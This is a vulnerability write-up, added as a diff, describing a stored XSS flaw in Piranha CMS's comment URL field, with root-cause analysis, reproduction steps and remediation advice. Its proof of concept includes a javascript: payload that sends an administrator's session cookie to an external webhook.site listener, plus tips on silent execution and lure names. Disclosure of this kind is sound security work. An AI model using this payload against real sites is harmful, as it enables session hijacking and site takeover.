@@ -1,0 +1,78 @@
+How a Simple "Comment URL" Can Hijack Your Piranha CMS Admin Session
+Finding a Critical Stored XSS in Piranha CMS: Why Razor’s Auto-Encoding isn't enough
+1. Executive Summary
+While auditing Piranha CMS (specifically versions using default Razor Pages), I discovered a critical Stored Cross-Site Scripting (XSS) vulnerability. The flaw exists in the way the system handles the CommentUrl field.
+
+In short, an attacker can bypass standard HTML encoding by leveraging the javascript: protocol. If an administrator simply clicks on a commenter's name in the management dashboard, their session cookie can be exfiltrated, leading to a full site takeover. I have documented the technical "blind spot" and a stealthy Proof-of-Concept (PoC) below.
+
+2. Vulnerability Identification & Scope
+Target: Piranha CMS (All versions using default Razor Pages templates)
+
+Vulnerability Type: Stored XSS (CWE-79)
+
+Severity: CRITICAL (8.8)
+
+Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
+
+Entry Point: The CommentUrl parameter in the comment submission handler.
+
+3. Deep-Dive Technical Analysis
+3.1 The Root Cause: The URL Protocol "Blind Spot"
+The fundamental flaw lies in how the CommentUrl is rendered within the anchor (<a>) tag's href attribute. In the default Razor templates, the code typically looks like this:
+
+HTML
+<a href="@Model.CommentUrl" target="_blank">@Model.Author</a>
+Why didn't Razor stop this? Razor is excellent at preventing tag-based XSS (e.g., <script>) because it automatically encodes < into &lt;. However, it does not validate the URL protocol. If the input is javascript:alert(1), Razor renders it as <a href="javascript:alert(1)">. This is perfectly valid HTML but extremely dangerous, as it allows arbitrary code execution upon interaction.
+
+3.2 Exploitation Mechanics: The "Attack Triangle"
+For this exploit to trigger, three conditions must be met:
+
+Storage: The attacker submits a comment via POST /Post?handler=SaveComment. Piranha CMS saves the raw javascript:... string into the Piranha_PostComments table.
+
+Configuration: The site must have comments enabled, and either auto-approve them or have an admin who reviews "Pending" comments.
+
+Interaction (The Click): The victim (Admin) must click the author's name. Attackers often use "Social Engineering" names like "Urgent: Security Issue Found" to entice a click.
+
+4. Proof of Concept: Step-by-Step Reproduction
+Step 1: Preparation (The Listener)
+The attacker sets up a listener (e.g., Webhook.site) to capture exfiltrated data.
+
+Step 2: Session Poisoning (The Injection)
+Using an intercepting proxy like Burp Suite, the attacker submits a comment with the following payload in the CommentUrl field:
+
+Payload: javascript:void(fetch('https://webhook.site/YOUR_ID?c='+document.cookie))
+
+Why void()? It ensures the attack is "silent." The browser won't navigate to a new page, so the admin won't realize their cookie was just sent to the attacker's server.
+
+Step 3: Triggering & Hijacking
+An Admin logs into the /manager panel and clicks on the malicious comment to inspect the user.
+
+Result: The JavaScript executes in the Admin's browser context, reads the .AspNetCore.Identity.Application cookie, and sends it to the attacker.
+
+Takeover: The attacker replaces their own cookie with the stolen one, gaining full administrative access without needing a password.
+
+5. Business & Security Impact
+Full Administrative Takeover: Attackers can delete posts, change passwords, or inject malicious scripts into the entire site.
+
+Data Exfiltration: Access to sensitive customer PII or private drafts.
+
+Malware Distribution: The attacker can modify the site to perform "Drive-by Downloads," infecting all site visitors.
+
+6. Remediation Strategy
+6.1 Technical Fix: URL Sanitization
+Implement a strict protocol whitelist at the Backend level. Only allow http:// and https://.
+
+C#
+// Example fix:
+if (!url.StartsWith("http://") && !url.StartsWith("https://")) {
+    url = "#"; // Neutralize unsafe protocols
+}
+6.2 Defense in Depth
+Use a Sanitization Library: Use Ganss.XSS to clean all HTML attributes before they touch the database.
+
+Content Security Policy (CSP): Implement a CSP header that restricts unsafe-inline scripts and prevents javascript: URI execution.
+
+Secure Templates: Add rel="noopener noreferrer nofollow" to external links and consider removing the link functionality from names in the admin panel if not strictly necessary.
+
+7. Conclusion
+This Piranha CMS vulnerability is a reminder that encoding is not validation. Relying solely on a framework's auto-encoding feature without validating the context (like a URL protocol) can leave the "front door" wide open for session hijacking.
